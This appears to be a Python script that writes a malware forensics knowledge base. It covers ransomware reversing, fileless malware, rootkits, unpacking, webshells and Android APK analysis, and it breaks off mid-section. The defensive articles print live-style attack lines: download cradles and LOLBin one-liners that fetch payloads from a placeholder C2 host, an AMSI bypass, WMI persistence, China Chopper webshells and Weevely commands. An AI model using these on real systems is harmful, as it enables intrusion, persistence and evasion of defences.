import os
OUTPUT = r"C:\Users\Tomo\ixion\src\ion\data\kb_forensics_advanced.py"

MALWARE_ADVANCED = '''
MALWARE_ADVANCED = [
    {
        "title": "Ransomware Reverse Engineering — From Sample to Decryptor",
        "tags": ["ransomware", "reverse-engineering", "cryptography", "decryption", "dfir"],
        "content": """Ransomware reverse engineering aims to understand encryption implementation well enough to recover keys or exploit weaknesses — turning a catastrophic incident into a recoverable one.

## Initial Triage

Before diving into disassembly, gather observable facts:

```
pescan sample.exe          # detect packer, check imports
strings -n 8 sample.exe | grep -iE "(aes|rsa|crypt|key|ransom|bitcoin|tor)"
floss sample.exe           # extract obfuscated strings
die sample.exe             # Detect-It-Easy: compiler, packer, overlay
```

Check for network activity IOCs in strings: C2 domains, Tor onion addresses, Bitcoin wallet patterns (`[13][a-km-zA-HJ-NP-Z1-9]{25,34}`).

## Unpacking First

Most modern ransomware is packed. Common packers and unpacking approaches:

**UPX**: `upx -d sample.exe -o unpacked.exe`

**Custom loaders**: Run in sandbox, dump from memory at OEP:
- x64dbg: set breakpoint on `VirtualAlloc` / `VirtualProtect`, dump when execution transfers to new region
- Scylla: fix IAT after dumping

## Identifying Crypto Implementation

Search for crypto constants in IDA/Ghidra:

```python
# IDA Python — find AES S-box
sbox_start = 0x637c777b  # first 4 bytes of AES S-box
for seg in idautils.Segments():
    for addr in idautils.Heads(idc.get_segm_start(seg), idc.get_segm_end(seg)):
        if idc.get_wide_dword(addr) == sbox_start:
            print(f"Possible AES S-box at: {hex(addr)}")
```

Key constants to search:
- AES S-box: `0x637c777b`
- AES round constant (Rcon): `0x01000000`
- ChaCha20 sigma: `expand 32-byte k` (ASCII `65787061 6e642033 322d6279 7465206b`)
- RSA: look for large prime generation, `CryptGenKey` / `BCryptGenerateKeyPair` imports

## Key Generation Analysis

Most ransomware uses a hybrid scheme:
1. Generate random symmetric key (AES-256 / ChaCha20) per file or per victim
2. Encrypt symmetric key with attacker's RSA/ECDH public key
3. Embedded public key or downloaded from C2

Locate the key generation routine:
- `CryptGenRandom` / `BCryptGenRandom` calls → symmetric key source
- `CryptImportKey` / `BCryptImportKeyPair` → loading embedded public key
- Look for base64-encoded blob in .data or .rsrc section

```
# Extract embedded public key blob
binwalk -e sample.exe
# or
foremost -t pem sample.exe
# or search for PEM header
strings sample.exe | grep -A 20 "BEGIN PUBLIC KEY"
```

## Tracing Encryption in x64dbg

Set breakpoints on crypto APIs:

```
bp CryptEncrypt
bp BCryptEncrypt
bp CreateFileW     # watch for file enumeration
bp MoveFileExW     # ransom note drop
```

Log parameters to extract keys at runtime:

```
# x64dbg conditional log on CryptEncrypt
// Log: "Key={[esp+4]}, DataLen={[esp+0xC]}, Data={[esp+8]}"
```

When `CryptEncrypt` is hit, dump the `hKey` handle, then call `CryptExportKey` to recover the raw key material before it is encrypted with the public key.

## Common Weaknesses

**Weak RNG**: Early ransomware used `srand(time(NULL))` — seed is the infection timestamp from filesystem timestamps. Script brute-force:

```python
import ctypes, time, datetime
# Find infection time from ransom note timestamp
infection_epoch = int(datetime.datetime(2024, 1, 15, 10, 30).timestamp())
for delta in range(-60, 60):
    seed = infection_epoch + delta
    # Reproduce PRNG sequence and try decryption
```

**IV reuse**: XOR first block of two encrypted files — if result is non-random, IV is static or derived from filename.

**Key stored locally**: Some families write the encrypted key to `%APPDATA%\\<malware_id>`. If the key file exists before the ransom note is sent, recovery may be possible.

**Symmetric key in memory**: If the machine hasn't been rebooted, dump memory and search for key material:

```
volatility3 -f memory.raw windows.malfind | grep -A5 "ransomware_pid"
# Then carve AES keys from process memory
bulk_extractor -E aes memory.raw -o aes_output/
```

## Known-Plaintext Attack

Office documents, ZIP files, and PE headers have known plaintext at fixed offsets. For ECB mode (rare) or with CTR/CFB stream recovery:

```python
from Crypto.Cipher import AES
# Known plaintext: PE header starts with 4D 5A (MZ)
known_plain = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF"
cipher_bytes = open("encrypted_file.enc", "rb").read()[:16]
# XOR to get keystream (for stream ciphers)
keystream = bytes(a ^ b for a, b in zip(cipher_bytes, known_plain))
```

## Family-Specific Notes

**LockBit 3.0**: ChaCha20 + RSA-2048. Key stored in file footer. Public key changes per campaign — no universal decryptor.

**ALPHV/BlackCat**: Rust-based, ChaCha20, intermittent encryption (partial file encryption for speed). Backup VSS deleted via `vssadmin`.

**Conti**: AES-256 CTR, RSA-4096 public key embedded in binary. Master private key leaked in 2022 — existing samples decryptable.

**Babuk** (ESXi variant): ECC + HC-128 stream cipher. Source code leaked — study for implementation patterns.

## Recovering from Partial Encryption

Some families only encrypt the first N bytes (intermittent encryption). Check:

```python
import math

def entropy(data):
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    return -sum((c/len(data)) * math.log2(c/len(data)) for c in counts if c)

with open("encrypted_file", "rb") as f:
    blocks = [f.read(4096) for _ in range(10)]
for i, block in enumerate(blocks):
    print(f"Block {i}: entropy={entropy(block):.2f}")
```

High entropy (>7.5) blocks are encrypted; low entropy blocks are plaintext. Partial recovery possible for document files where header is encrypted but body is not.

## Reporting Findings

Document:
1. Crypto algorithm and mode (AES-256-CBC, ChaCha20, etc.)
2. Key derivation method (random, PBKDF2, weak PRNG)
3. Key storage location (memory, file, C2 transmission)
4. Any recoverable weaknesses (IV reuse, key reuse, weak RNG)
5. Recommended decryption approach or referral to No More Ransom (nomoreransom.org)
""",
    },
    {
        "title": "Fileless Malware — Detection and Memory Forensics",
        "tags": ["fileless-malware", "living-off-the-land", "memory-forensics", "powershell", "wmi"],
        "content": """Fileless malware executes entirely in memory, leveraging built-in OS tools and leaving minimal disk artifacts. Traditional AV scanning is largely ineffective — detection relies on behavioral analysis and memory forensics.

## Attack Vectors

**PowerShell download cradles**:
```powershell
# Classic cradle
IEX (New-Object Net.WebClient).DownloadString('http://C2/stage2.ps1')

# BITS transfer (bypasses some proxies)
Start-BitsTransfer -Source 'http://C2/payload' -Destination $env:TEMP\\p.exe

# Encoded command (evade string detection)
powershell -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AQwAyAC8AcABhAHkAbABvAGEAZAAnACkAIAB8ACAASQBFAFgA
```

Decode: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABj...'))`

**WMI persistence**:
```powershell
# Create event subscription that runs payload on login
$FilterArgs = @{Name='MalFilter'; EventNameSpace='root\CimV2';
    QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{Name='MalConsumer'; CommandLineTemplate='powershell.exe -enc <payload>'}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
```

Persistence stored in WMI repository (`C:\Windows\System32\wbem\Repository\`), not as files.

**Reflective DLL injection**: DLL loaded from memory buffer without touching disk. `ReflectiveDLLInjection` by Stephen Fewer is the canonical implementation.

## Detection: Process and Memory Analysis

### PowerShell Script Block Logging

Enable for detection:
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
EnableScriptBlockLogging = 1
EnableScriptBlockInvocationLogging = 1
```

Logs to: `Microsoft-Windows-PowerShell/Operational` (Event ID 4104)

Search for suspicious patterns:
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Where-Object {$_.Id -eq 4104 -and $_.Message -match 'IEX|DownloadString|Invoke-Expression|WebClient'}
```

### Volatility 3 — Fileless Indicators

```bash
# Find injected code in process memory
vol -f memory.raw windows.malfind --pid 1234

# Look for PowerShell with no corresponding script file
vol -f memory.raw windows.cmdline | grep -i powershell

# WMI subscriptions persisted in memory
vol -f memory.raw windows.registry.printkey --key "SOFTWARE\\Microsoft\\WBEM"

# Find .NET assemblies loaded in process (PowerShell/C# implants)
vol -f memory.raw windows.dlllist --pid <powershell_pid> | grep -v "\\Windows\\"
```

### Detecting Reflective DLL Injection

Indicators:
- Memory region with `PAGE_EXECUTE_READWRITE` not backed by a file on disk
- `MZ` header in process heap or stack
- Module in PEB module list has no corresponding file

```bash
# malfind shows MZ or shellcode headers in non-backed memory
vol -f memory.raw windows.malfind | grep -B2 "MZ"

# VAD comparison — memory regions without file backing
vol -f memory.raw windows.vadinfo --pid <pid> | grep "Vad.*PRIVATE.*EXECUTE"
```

### Process Hollowing Detection

```bash
vol -f memory.raw windows.hollowprocesses
# Also check:
vol -f memory.raw windows.pslist | grep svchost  # unexpected parent
vol -f memory.raw windows.pstree                 # anomalous tree structure
```

Signs:
- Process image on disk doesn't match memory (different PE headers)
- PEB points to legitimate path but memory contains different code
- Timestamps don't match

## WMI Forensics

WMI repository artifacts (offline analysis):
```bash
# Parse WMI repository with python-cim
pip install python-cim
python -m cim.index C:\Windows\System32\wbem\Repository\

# Look for subscriptions
python -m cim.q 'SELECT * FROM __EventFilter' ./repository/
python -m cim.q 'SELECT * FROM CommandLineEventConsumer' ./repository/
```

Registry-based WMI: Some older persistence uses `HKLM\SOFTWARE\Microsoft\WBEM\ESS\`.

## Living off the Land Binaries (LOLBins)

Common LOLBins for fileless execution:

| Binary | Technique |
|--------|-----------|
| `mshta.exe` | Execute HTA from URL: `mshta http://C2/payload.hta` |
| `regsvr32.exe` | Squiblydoo: `regsvr32 /s /n /u /i:http://C2/payload.sct scrobj.dll` |
| `certutil.exe` | Download: `certutil -urlcache -f http://C2/payload payload.exe` |
| `wmic.exe` | Execute: `wmic process call create "powershell -enc <b64>"` |
| `msiexec.exe` | `msiexec /q /i http://C2/payload.msi` |
| `rundll32.exe` | `rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";...` |

Detection: Monitor Sysmon Event ID 1 (process creation) with parent-child anomaly detection. Alert when `mshta`, `regsvr32`, or `certutil` make outbound network connections.

## Memory-Only Implants

Cobalt Strike beacon loaded reflectively leaves these artifacts:

```bash
# CS beacon config extraction
vol -f memory.raw windows.malfind | grep -i beacon
# Extract beacon config from memory dump
python cs-extract-beacon-config.py beacon_dump.bin
# Config reveals: C2 domains, sleep timer, jitter, staging method
```

Metasploit meterpreter (stageless):
- Loaded via `VirtualAlloc` + `CreateThread`
- Identifiable by `ReflectiveLoader` export in memory
- Network: TLS to C2 on port 4444 (default)

## Persistence Without Files

**Registry Run key with encoded PowerShell**:
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Updater = "powershell -w hidden -enc JABjAD0A..."
```

**Scheduled task with inline action** (stored in `C:\Windows\System32\Tasks\` XML — but payload is encoded):
```xml
<Exec>
  <Command>powershell.exe</Command>
  <Arguments>-EncodedCommand JABj...</Arguments>
</Exec>
```

**AMSI bypass** (common in fileless attacks):
```powershell
# Patch AmsiScanBuffer in memory (detected by EDR)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Detecting AMSI bypass: Event ID 4104 with `amsiInitFailed` or `AmsiUtils` patterns; memory scan for AMSI function patch bytes.

## Hunting in SIEM

Sigma rule for encoded PowerShell:
```yaml
title: Suspicious Encoded PowerShell Execution
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - ' -enc '
            - ' -EncodedCommand '
            - 'JABj'     # common base64 prefix for $c=
            - 'JABX'     # $W=
    condition: selection
falsepositives:
    - Legitimate automation tools using encoded commands
level: medium
```
""",
    },
    {
        "title": "Rootkit Analysis — Kernel-Mode Detection Techniques",
        "tags": ["rootkit", "kernel", "dkom", "ssdt", "uefi", "volatility"],
        "content": """Rootkits operate at or below the OS kernel to hide processes, files, network connections, and registry keys. Detection requires operating outside the rootkit's visibility — using memory forensics, hypervisor-based tools, or hardware-level inspection.

## Rootkit Categories

| Type | Hook Location | Persistence | Detection Difficulty |
|------|--------------|-------------|---------------------|
| User-mode | IAT/EAT hooks, DLL injection | Registry Run | Low |
| SSDT hooks | System Service Descriptor Table | Driver load | Medium |
| DKOM | Kernel object manipulation | Direct | High |
| Bootkit | MBR/VBR/EFI | Firmware | Very High |
| UEFI rootkit | SPI flash | Firmware | Extreme |

## DKOM (Direct Kernel Object Manipulation)

The most common technique for hiding processes. Each process has an `_EPROCESS` structure linked in a doubly-linked list (`ActiveProcessLinks`). Unlinking an entry hides the process from Task Manager and `EnumProcesses()`.

Detecting with Volatility 3:

```bash
# pslist uses ActiveProcessLinks (can be subverted)
vol -f memory.raw windows.pslist

# psscan scans memory pool tags (bypasses DKOM)
vol -f memory.raw windows.psscan

# Cross-reference: processes in psscan but not pslist = hidden
comm -23 <(vol -f memory.raw windows.psscan | awk '{print $1}' | sort) \
         <(vol -f memory.raw windows.pslist | awk '{print $1}' | sort)
```

Comparing thread lists:

```bash
vol -f memory.raw windows.thrdscan   # scan for ETHREAD structures
vol -f memory.raw windows.threads    # walk linked list
# Orphaned threads (in thrdscan, not in threads list) → DKOM on threads
```

## SSDT Hook Detection

SSDT (System Service Descriptor Table) maps syscall numbers to kernel functions. Rootkits replace table entries with pointers to their own code.

```bash
vol -f memory.raw windows.ssdt
# Output shows each syscall entry; legitimate entries point to ntoskrnl.exe or win32k.sys
# Entries pointing to other drivers = hooked

# Example suspicious output:
# 0x0012 NtOpenProcess       0xfffff880041a3200 UNKNOWN
# ^^^^^ should point to ntoskrnl.exe, not UNKNOWN module
```

Cross-checking with WinDbg (live system):
```
kd> dps nt!KiServiceTable L200
# Each entry should be within ntoskrnl address range
# Out-of-range entries are hooks
```

## IRP Hook Detection

Device drivers handle I/O via IRP (I/O Request Packet) dispatch tables. Rootkits replace these pointers to intercept disk reads, network packets, etc.

```bash
vol -f memory.raw windows.driverirp
# Shows IRP major function pointers for each driver
# Pointers not belonging to the driver's module = hooks

# Example: disk.sys IRP_MJ_READ pointing to rootkit.sys address
```

## Kernel Module Hiding

```bash
# modlist walks PsLoadedModuleList (can be manipulated)
vol -f memory.raw windows.modlist

# modscan scans memory for KLDR_DATA_TABLE_ENTRY structures
vol -f memory.raw windows.modscan

# Modules in modscan but not modlist = hidden kernel modules
```

Also check callbacks:
```bash
vol -f memory.raw windows.callbacks
# Lists registered kernel callbacks (PsSetCreateProcessNotifyRoutine, etc.)
# Unexpected callback addresses indicate rootkit presence
```

## Bootkit Analysis

Bootkits infect the Master Boot Record (MBR) or Volume Boot Record (VBR) to load before the OS.

**MBR analysis**:
```bash
# Extract MBR from disk image
dd if=disk.img of=mbr.bin bs=512 count=1

# Compare to known good MBR
md5sum mbr.bin
# Windows 10 MBR MD5: varies by Windows version, but compare to clean baseline

# Disassemble MBR
ndisasm -b 16 -o 0x7c00 mbr.bin | head -50
# Legitimate MBR jumps to partition table; suspicious MBR reads additional sectors
```

**Bootkit detection tools**:
- GMER: scans MBR, SSDT, IAT hooks (Windows live system)
- Kaspersky TDSS Killer: targets TDL/TDSS family
- Malwarebytes Anti-Rootkit: broad bootkit detection

## UEFI Rootkit Analysis

UEFI rootkits survive OS reinstallation and are stored in SPI flash. Examples: LoJax (2018), MosaicRegressor (2020), CosmicStrand (2022).

**Detection approaches**:

```bash
# Dump UEFI firmware with CHIPSEC
pip install chipsec
python chipsec_main.py -m tools.uefi.whitelist
python chipsec_main.py -m common.bios_smi  # check SMI handler security
python chipsec_main.py -m common.secureboot.variables

# Dump SPI flash
python chipsec_util.py spi dump firmware.bin

# Analyze firmware with UEFITool
# Look for: unknown DXE drivers, modified boot loaders, suspicious GUIDs
```

**Secure Boot bypass indicators**:
- `db` (allowed signatures database) contains unexpected certificates
- `dbx` (forbidden signatures) outdated or missing known bad hashes
- BIOS write protection disabled (CHIPSEC `common.bios_wp` reports "NOT PROTECTED")

## Hypervisor-Based Rootkits

Blue Pill, SubVirt class: VM-based rootkit intercepts all hardware access.

Detection:
- Timing attacks: `CPUID` + `RDTSC` latency measurements; VM exits add measurable overhead
- `CPUID` leaf 0x40000000 reveals hypervisor vendor string
- Hyper-V, VMware, KVM all have signatures — unexpected hypervisor signatures are suspicious

```python
import ctypes
# Check hypervisor bit in CPUID ECX (bit 31)
# If set outside of known VM environments → suspicious
```

## Memory Forensics for Rootkit IOCs

Full rootkit investigation checklist:

```bash
# 1. Hidden processes
vol -f mem.raw windows.psscan > psscan.txt
vol -f mem.raw windows.pslist > pslist.txt
diff <(awk '{print $2}' pslist.txt | sort) <(awk '{print $2}' psscan.txt | sort)

# 2. Hidden kernel modules
vol -f mem.raw windows.modscan > modscan.txt
vol -f mem.raw windows.modlist > modlist.txt

# 3. SSDT hooks
vol -f mem.raw windows.ssdt | grep -v "ntoskrnl\|win32k"

# 4. IRP hooks
vol -f mem.raw windows.driverirp | grep -v "Expected"

# 5. Callbacks
vol -f mem.raw windows.callbacks | grep -v "ntoskrnl\|ks.sys\|ndis.sys"

# 6. Network connections (may be hidden from netstat)
vol -f mem.raw windows.netstat

# 7. VAD anomalies (executable heap/stack)
vol -f mem.raw windows.vadinfo | grep "EXECUTE_READWRITE"
```

## Remediation

Rootkits require offline remediation — do not attempt cleanup on live system.

1. Boot from trusted external media (WinPE, Linux live USB)
2. Mount infected drive as secondary
3. Run offline AV scan (Windows Defender Offline, ESET SysRescue)
4. For bootkits: `bootrec /fixmbr` and `bootrec /fixboot` (Windows RE)
5. For UEFI rootkits: BIOS flash from vendor with verified firmware
6. Rebuild from known-good image rather than attempting cleanup on complex rootkits
""",
    },
    {
        "title": "Unpacking Malware — Automated and Manual Techniques",
        "tags": ["packing", "unpacking", "upx", "pe", "x64dbg", "anti-analysis"],
        "content": """Packers compress or encrypt malware to evade static detection and complicate analysis. Unpacking — recovering the original executable — is a prerequisite for meaningful reverse engineering.

## Identifying Packed Samples

```bash
# Detect-It-Easy
die sample.exe

# PEiD (legacy but useful database)
peid sample.exe

# Entropy analysis — packed sections have entropy > 7.0
python3 -c "
import math, sys
data = open(sys.argv[1], 'rb').read()
freq = [data.count(bytes([i])) for i in range(256)]
entropy = -sum(f/len(data) * math.log2(f/len(data)) for f in freq if f)
print(f'Entropy: {entropy:.4f}')
" sample.exe

# PE section entropy with pefile
import pefile
pe = pefile.PE('sample.exe')
for s in pe.sections:
    print(s.Name.decode().rstrip(chr(0)), s.get_entropy())
# Packed: single section with entropy 7.8+, or .text entropy < 6 with .rsrc > 7.5
```

High-entropy sections, minimal imports (only `LoadLibraryA` / `GetProcAddress`), and a non-standard section name (`.UPX0`, `.packed`, `.nsp0`) all indicate packing.

## UPX Unpacking

```bash
# Automatic (when not tampered)
upx -d sample.exe -o unpacked.exe

# When UPX magic bytes are overwritten (common evasion)
# Restore: patch bytes at offset 0x178 back to "UPX!"
python3 -c "
data = bytearray(open('sample.exe','rb').read())
data[0x178:0x182] = b'UPX!UPX!'
open('sample_fixed.exe','wb').write(data)
"
upx -d sample_fixed.exe -o unpacked.exe
```

## Manual Unpacking with x64dbg

**General OEP (Original Entry Point) hunting**:

1. Open sample in x64dbg
2. Run to entry (F9 once to reach unpacker stub)
3. Look for `pushad` near start — unpacker often saves registers, does work, then `popad` + `jmp OEP`
4. Set hardware breakpoint on ESP after `pushad`: note ESP value, then `ba r4 <ESP_value>`
5. Run (F9) — will break when stack pointer is restored at `popad`
6. Single-step past `jmp` to reach OEP

**ESP trick in detail**:
```
pushad                    ; saves all registers
mov  esi, packed_data     ; unpacker begins
...decryption loop...
popad                     ; restores registers (triggers HW BP on ESP)
jmp  OEP                  ; jump to original code
```

After breaking at OEP: use Scylla (plugin) → "IAT Autosearch" → "Get Imports" → "Fix Dump" to rebuild a working PE.

## Scripting Unpacking with x64dbg

```python
# x64dbgpy script for automated OEP detection
import x64dbgpy.pluginsdk as sdk

# Set BP on VirtualProtect to catch when unpacker marks OEP region executable
sdk.SetBreakpoint(sdk.GetProcAddress("kernel32.dll", "VirtualProtect"))

def on_breakpoint(addr):
    if addr == sdk.GetProcAddress("kernel32.dll", "VirtualProtect"):
        # Check if region is being made executable
        protect = sdk.GetFunctionParam(3)  # flNewProtect
        if protect in [0x20, 0x40]:  # PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE
            sdk.Log(f"VirtualProtect making region executable at {hex(sdk.GetFunctionParam(0))}")
```

## Automated Unpacking

**Qiling Framework** (emulation-based):
```python
from qiling import Qiling
from qiling.const import QL_VERBOSE

ql = Qiling(["sample.exe"], "C:/Windows/", verbose=QL_VERBOSE.OFF)

# Hook VirtualProtect to detect OEP
def hook_vprotect(ql, address, size, *args):
    protect = ql.mem.read_ptr(ql.arch.regs.esp + 0xC)
    if protect in [0x20, 0x40]:
        ql.log.info(f"Executable region created at {hex(ql.arch.regs.eax)}")

ql.set_api("VirtualProtect", hook_vprotect)
ql.run()
```

**UnpacMe** (online service): Upload sample, receive unpacked layers.

**CAPE Sandbox**: Automatically unpacks and extracts configs for 50+ malware families.

## .NET Packing and Obfuscation

.NET malware uses .NET-specific protectors: ConfuserEx, .NET Reactor, Eazfuscator, DNGuard.

Detection:
```bash
dnspy --version  # or use de4dot for deobfuscation

# de4dot auto-detects and deobfuscates many .NET protectors
de4dot sample.exe -o clean.exe

# For custom obfuscation, use dnSpy to trace IL execution
# Set BP on Module.Load or Assembly.Load to catch dynamic assembly loading
```

ConfuserEx indicators: many `<Module>` nested types, random method names, encrypted string resources.

## VMP (VMProtect) and Themida

Advanced commercial protectors using code virtualization: original instructions are replaced with a custom VM bytecode executed by an embedded interpreter.

Approach:
1. Do not attempt full devirtualization (impractical)
2. Use DynamoRIO or Intel PIN to trace actual API calls at runtime
3. Focus on behavior, not code structure
4. Use CAPE/Cuckoo to extract config from unpacked memory segments

**Tenet** (IDA plugin) for VM trace visualization:
```
# Record execution trace with Intel PIN
pin -t tenet_record.so -- sample.exe
# Load trace in IDA Tenet plugin for time-travel debugging
```

## Extracting Configs from Unpacked Malware

After unpacking, malware configs (C2, encryption keys, mutex names) are usually in plaintext in memory:

```bash
# strings on dumped memory region
strings -n 6 dumped_region.bin | grep -E "([0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z0-9-]+\\.(com|net|org|ru|cn)"

# YARA on dumped file
yara malware_configs.yar unpacked.exe

# Family-specific config extractors
# malduck library
from malduck import procmem
mem = procmem.ProcessMemoryFile("memory_dump.dmp")
# Search for Cobalt Strike config
cs_config = mem.findp(b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00")
```

## Summarizing an Unpacked Sample

After successful unpacking, document:
- Original packer/protector identified
- Unpacking method used (automatic/manual/emulation)
- OEP address
- Original imports (full IAT)
- Entropy of original executable (should be <7.0)
- Any config strings extracted
- SHA-256 of unpacked binary for reference
""",
    },
    {
        "title": "Webshell Detection and Analysis",
        "tags": ["webshell", "web-forensics", "php", "aspx", "detection"],
        "content": """Webshells are malicious scripts uploaded to web servers to provide persistent remote access. Detecting them requires examining web-accessible directories for suspicious files, reviewing access logs, and understanding obfuscation techniques.

## Common Webshell Characteristics

**PHP webshells** — key functions to search for:
```
eval(), system(), exec(), shell_exec(), passthru(), popen(), proc_open()
base64_decode(), str_rot13(), gzinflate(), gzuncompress(), str_replace()
$_GET, $_POST, $_REQUEST, $_COOKIE (user-controlled input passed to execution)
```

**ASPX webshells** — key patterns:
```
Process.Start(), WScript.Shell, eval(), Execute()
HttpServerUtility.Execute(), Response.BinaryWrite()
System.Reflection.Assembly.Load()
```

**JSP webshells**:
```java
Runtime.getRuntime().exec()
ProcessBuilder
ClassLoader.defineClass()  // reflective loading
```

## Filesystem Scanning

```bash
# Find recently modified PHP files
find /var/www -name "*.php" -newer /var/www/html/index.php -ls

# Search for eval+base64 combination
grep -rn --include="*.php" "eval.*base64_decode\|base64_decode.*eval" /var/www/

# Find files with suspicious function combinations
grep -rPl "eval\s*\(" /var/www/ | xargs grep -l "base64_decode\|str_rot13\|gzinflate"

# Files with unusual permissions
find /var/www -name "*.php" -perm /0111 -ls  # executable PHP files

# Hidden files (starting with dot)
find /var/www -name ".*" -ls

# Recently created files (last 7 days)
find /var/www -mtime -7 -name "*.php" -o -name "*.aspx" -o -name "*.jsp" | head -50
```

**NeoPI** (Python script for detecting obfuscated webshells):
```bash
python neopi.py /var/www/ -a -A
# Scores files by entropy, longest word, IC (Index of Coincidence), compression ratio
```

## Static Analysis Examples

**Single-line PHP webshell** (China Chopper variant):
```php
<?php @eval($_POST['cmd']);?>
```

**Obfuscated with base64**:
```php
<?php $a=base64_decode("c3lzdGVt");$a($_GET['c']);?>
# Decoded: system($_GET['c'])
```

**Multi-layer obfuscation**:
```php
<?php
$o = "as";
$e = $o."se";
$r = $e."rt";  // "assert"
$r(base64_decode(str_rot13(gzinflate(base64_decode('...'))))));
?>
```

Deobfuscate by replacing `$r(...)` with `echo(...)` and running in a sandboxed PHP interpreter.

**ASPX China Chopper** (binary variant):
```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
```

## Access Log Analysis

```bash
# Find POST requests to uploaded files (webshell interaction)
grep -E "POST .*\.(php|aspx|jsp)" /var/log/apache2/access.log

# Find requests with suspicious parameters
grep -E "cmd=|exec=|shell=|c=|pass=" /var/log/apache2/access.log

# Identify C2 IP addresses (consistent source IP, many requests to one file)
awk '/shell\.php/ {print $1}' access.log | sort | uniq -c | sort -rn | head

# Unusual user agents associated with webshell clients
grep -E "Mozilla/5\.0 \(compatible\)" access.log | grep "200\|500"
# China Chopper client UA: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"

# Large response sizes for GET requests (data exfiltration)
awk '{if ($9==200 && $10>50000) print}' access.log | grep ".php"
```

**Web server error logs** — webshell errors reveal attacker activity:
```bash
grep -E "Warning|Error|Fatal" /var/log/apache2/error.log | tail -100
# PHP warnings from webshell reveal file paths and operation attempts
```

## Webshell Families

**China Chopper**: Tiny (25 bytes), two-stage — client-side controller connects to single-line shell. Encrypted traffic via proprietary protocol.

**WSO (Web Shell by oRb)**: Full-featured file manager, SQL browser, reverse shell. PHP, recognizable by `$auth_pass` MD5 hash at top.

**b374k**: Password-protected, file manager, command execution, bind/reverse shell.

**Weevely**: PHP payload generator + Python client. Generates steganographic PHP shell (commands hidden in Cookie header, responses in HTML comments).

```bash
# Generate Weevely agent
weevely generate <password> /tmp/agent.php
# Connect
weevely http://victim.com/uploads/agent.php <password>
```

## YARA Rules for Webshells

```yara
rule Webshell_PHP_Generic {
    meta:
        description = "Generic PHP webshell detection"
    strings:
        $eval = "eval(" nocase
        $b64  = "base64_decode(" nocase
        $sys  = "system(" nocase
        $post = "$_POST[" nocase
        $get  = "$_GET[" nocase
    condition:
        filesize < 100KB and $eval and ($b64 or $sys) and ($post or $get)
}

rule Webshell_ChinaChopper {
    meta:
        description = "China Chopper ASPX variant"
    strings:
        $s1 = "eval(Request.Item[" nocase
        $s2 = "unsafe" nocase
        $s3 = "Jscript" nocase
    condition:
        all of them
}
```

## Post-Discovery Steps

1. **Preserve evidence**: Copy webshell file with metadata intact, hash it
2. **Identify upload vector**: Check error logs, form submission logs, CVE for the web app
3. **Determine persistence**: Check cron jobs, `.htaccess` modifications, new admin accounts
4. **Map attacker activity**: Correlate webshell access times with access log entries
5. **Check for lateral movement**: Outbound connections from web server around access times
6. **Remediate**: Remove webshell, patch upload vulnerability, rotate credentials, audit all web-accessible files
""",
    },
    {
        "title": "Mobile Malware Analysis — Android APK Investigation",
        "tags": ["android", "apk", "mobile-malware", "jadx", "frida"],
        "content": """Android malware analysis requires APK decompilation, Dalvik bytecode analysis, permission review, and dynamic hooking. The open ecosystem and sideloading capabilities make Android a frequent target.

## APK Structure

An APK is a ZIP archive containing:
```
AndroidManifest.xml  — permissions, activities, services, receivers (binary XML)
classes.dex          — Dalvik bytecode (main app logic)
classes2.dex         — multidex apps
res/                 — resources, layouts
assets/              — raw assets (may hide payloads)
lib/                 — native .so libraries
META-INF/            — signing certificate
```

## Static Analysis

### Extract and Decompile

```bash
# Unzip APK
unzip malware.apk -d apk_extracted/

# Decode binary XML and resources
apktool d malware.apk -o apk_decoded/

# Decompile to Java source
jadx malware.apk -d jadx_output/
# or
jadx-gui malware.apk  # GUI with decompiled source

# Inspect certificate
keytool -printcert -file META-INF/CERT.RSA
openssl pkcs7 -inform DER -in META-INF/CERT.RSA -noout -text
```

### AndroidManifest Analysis

Key elements to review:
```xml
<!-- Dangerous permissions -->
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.CAMERA"/>

<!-- Device Admin — prevents uninstall -->
<receiver android:name=".AdminReceiver">
    <meta-data android:name="android.app.device_admin"/>
</receiver>

<!-- Persistence via boot receiver -->
<receiver android:name=".BootReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver>

<!-- Accessibility service — keylogging, screen reading -->
<service android:name=".AccessibilityService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
```

### Code Analysis with jadx

Search for suspicious patterns:
```java
// C2 communication
new URL("http://192.168.1.1/gate.php").openConnection()
HttpsURLConnection
OkHttpClient  // common HTTP library

// SMS interception
